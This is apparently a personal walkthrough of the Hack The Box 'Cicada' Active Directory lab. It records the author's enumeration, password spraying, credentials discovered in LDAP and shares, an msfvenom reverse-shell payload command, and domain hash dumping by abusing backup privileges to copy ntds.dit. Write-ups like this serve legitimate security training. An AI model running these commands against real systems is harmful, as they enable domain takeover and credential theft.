---
tags:
  - HTB
  - Seasonal
  - easy
  - Windows
  - SMB
  - DomainEnumeration
creation date: 2018-09-29
Date Completed: 2024-08-24
CVEs: 
URL: 
IP: 10.129.192.218
New Tools: regpol, autorecon
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

### ffuf (Directories/Subdomain/Files)
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt:FUZZ -u $URL/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u $URL/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.domain.htb" -c
```

`-recursion -recursion-depth 1`

When raft fails
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u $URL/FUZZ -c
```
### Nikto (Identify Technology)

```
nikto -h $URL -C all
```

### SMB


![[Pasted image 20240928145423.png]]

![[Pasted image 20240928145339.png]]

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

### AutoRecon

CICADA-DC.cicada.htb

### Enumerating LDAP or trying to...

```
ldapsearch -x -H ldap://10.129.194.225 -D 'cicada.htb\info' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=CICADA,DC=HTB"
```


```
# nothing
crackmapexec ldap 10.129.192.218 -d cicada.htb -u info -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)


```
# nothing
ldapdomaindump 10.129.194.225 -u 'CICADA.HTB\info' -p 'Cicada$M6Corpb*@Lp#nZp!8' --no-json --no-grep 
```

```
# nothing new
crackmapexec smb 10.129.192.218 -d cicada.htb -u info -p 'Cicada$M6Corpb*@Lp#nZp!8' -M spider_plus --share SYSVOL
```

```
# took too long
./kerbrute_linux_amd64 userenum -d CICADA.HTB --dc 10.129.192.218 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
# nothing
rpcclient //cicada-dc.cicada.htb -U domain.local/info%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
```

```
# nothing
bloodhound-python -u 'info' -p 'Cicada$M6Corpb*@Lp#nZp!8' -ns 10.129.194.225 -d cicada.htb -c all
```

```
# nothing; requires bind
impacket-GetUserSPNs -dc-ip 10.129.194.225 'CICADA.HTB/info:Cicada$M6Corpb*@Lp#nZp!8'
```

```
./kerbrute_linux_amd64 passwordspray -d CICADA.HTB --dc 10.129.192.218 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 'Cicada$M6Corpb*@Lp#nZp!8'
```

so ldap is out... requires bind... so quit trying ldap

```
# nothing
./udp-proto-scanner.pl 10.129.192.225
```

# Back at it...

autorecon
```
autorecon 10.129.32.202 --single-target -v --only-scans-dir
```
examine the manual_commands.txt file 
```
crackmapexec winrm 10.129.32.202 -d 'CICADA.HTB' -u '/usr/share/seclists/Usernames/top-usernames-shortlist.txt' -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

```
bloodhound-python -u 'support' -p 'Cicada$M6Corpb*@Lp#nZp!8' -ns 10.129.32.202 -d cicada.htb -c all
```

```
ldapdomaindump 10.129.32.202 -u 'CICADA.HTB\support' -p 'Cicada$M6Corpb*@Lp#nZp!8' --no-json --no-grep 
```

```
ldapsearch -x -H ldap://10.129.32.202 -D 'cicada.htb\support' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=CICADA,DC=HTB"
```

```
crackmapexec winrm 10.129.32.202 -d 'CICADA.HTB' -u 'support' -p '/usr/share/seclists/Passwords/darkweb2017-top100.txt'
```

```
kerbrute -domain cicada.htb -users /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

and my vm can't handle it :(((((

# I can't believe i'm stuck at the foothold

switching back to ghost kali to see what i can do there. that vmware machine is trash

```
enumify.sh -H 10.129.32.202 -t All
```

# Gotdamn

it was rpc all along

```
rpcclient $IP -U "guest"
```

![[Pasted image 20240929125834.png]]

```
impacket-lookupsid guest@10.129.32.202
```

![[Pasted image 20240929125852.png]]

```
crackmapexec winrm 10.129.32.202 -d 'CICADA.HTB' -u 'users' -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

```
crackmapexec ldap 10.129.32.202 -d 'CICADA.HTB' -u 'users' -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```
![[Pasted image 20240929130409.png]]

'CICADA.HTB\michael.wrightson'
'CICADA.HTB\Dev Support'

```
crackmapexec smb 10.129.32.202 -d cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -M spider_plus --share SYSVOL
```

```
psexec.py 'CICADA.HTB/michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8'@10.129.32.202
```

![[Pasted image 20240929143125.png]]

```
crackmapexec winrm 10.129.32.202 -d 'CICADA.HTB' -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

what we know so far
1. Got a list of users using rpcclient (this was a new one for me)
2. Credentials for Michael Wrightson
3. can't winrm
4. can't write to SMB shares (so no psexec)
5. No AD CS 
6. Group Policy shit in SYSVOL - unable to find anything useful
7. No SPNs

# Foothold 🦶

got this to work finally... wasn't using the correct format for -D 
```
ldapsearch -x -H ldap://10.129.32.202 -D 'cicada\michael.wrightson' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=CICADA,DC=HTB"
```

```
ldapsearch -x -H ldap://10.129.32.202 -D 'cicada\michael.wrightson' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "CN=Remote Desktop Users,CN=Builtin,DC=CICADA,DC=HTB"
```

```
ldapsearch -x -H ldap://10.129.32.202 -D 'cicada\michael.wrightson' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "CN=Users,DC=CICADA,DC=HTB"
```

![[Pasted image 20240929151032.png]]
David, you beautiful man 💘

david.orelious@cicada.htb
```
aRt$Lp#7t*VQ!3
```

What i know
1. no PSEXEC for david
2. no winrm for david
3. no kerberoasting for some reason even though bloodhound says i can


check for specific info about david... nothing useful
```
ldapsearch -x -H ldap://10.129.32.202 -D 'cicada\david.orelious' -w 'aRt$Lp#7t*VQ!3' -b "CN=David Orelious,CN=Users,DC=CICADA,DC=HTB"
```

guess we'll try the SMB shares again...
```
crackmapexec smb 10.129.32.202 -d cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -M spider_plus
```
bingo! 🐶
![[Pasted image 20240929154119.png]]

![[Pasted image 20240929154222.png]]

emily.oscars
```
Q!3@Lp#M6b*7t*Vt
```

What can emily do?
1. no winrm
2. no psexec

```
crackmapexec smb 10.129.32.202 -d cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -M spider_plus
```
was taking way too long so i decided i would do it manually... discovered why it took so long...

![[Pasted image 20240929160131.png]]


donpapi didn't get me anything...
```
donpapi collect -u 'cicada.htb/emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -d cicada.htb -t ALL --fetch-pvk --dc-ip 10.129.32.202
```

Shit i overlooked a clue...
![[Pasted image 20240929173847.png]]

According to this she can winrm........
![[Pasted image 20240929175610.png]]
omfg -- i swear to got this entire box has been a lesson on how important getting the formatting correct is......................

![[Pasted image 20240929175743.png]]

# Priv Esc

1. checked privs - nothing special
2. ran LaZange. - nothing
3. Tried copying ntds.dit (cause i got confused) - nothing

going down this list https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.64 LPORT=1337 -f exe > s.exe
```

```
.\winPEASx64.exe log=wp_emily
```

~~I lied... i have backup and restore privileges...~~

impacket-smbserver -smb2support share $(pwd) 

Extract `SYSTEM` and `SAM` for hash retrieval:
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
retrieve hashes?
```
samdump2 SYSTEM.SAV SAM.SAV 
```

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators
https://github.com/intotheewild/OSCP-Checklist/blob/main/04.%20Active%20Directory%20Enumeration.md
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/privilege-escalation-checklist


very helpful article about dumping hashes
https://www.hackingarticles.in/credential-dumping-sam/


![[Pasted image 20240929211340.png]]
not really sure what i'm doing wrong. i cant crack the hash and i cant pass the hash with anything.


```
aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42  
			  LM                :             NT
```

If you get ‘aad3b435b51404eeaad3b435b51404ee’ in the LM hash, it means you’re dealing with a version of Windows where LM hashes aren’t supported by default (new Windows versions).

```
Example of the output : Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
https://meriemlarouim.medium.com/credentials-in-windows-and-how-to-dump-them-remotely-b5c315bb76f4
fuuuu...

helpful
https://exploit-notes.hdks.org/exploit/cryptography/algorithm/ntlm-ntlmv2/

loading powershell scripts in meterpreter session
![[Pasted image 20240929214728.png]]

did not work at all
```
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.                                      2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.                                      3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2016+ Build 20348          
 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.               
 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                                                             6   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated. 
```



https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

```
reg save hklm\system c:\temp\system
```

```
nano backup.dsh
set context persistent nowriters
add volume c: alias backupz
create
expose %backupz% z:
unix2dos backup.dsh
```

```
cd C:\Temp
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit
```

```
reg save hklm\system c:\Temp\system
cd C:\temp
download ntds.dit
download system
```


```
impacket-secretsdump -ntds ntds.dit -system system local
```

![[Pasted image 20240930125823.png]]

![[Pasted image 20240930130025.png]]

amen 🙏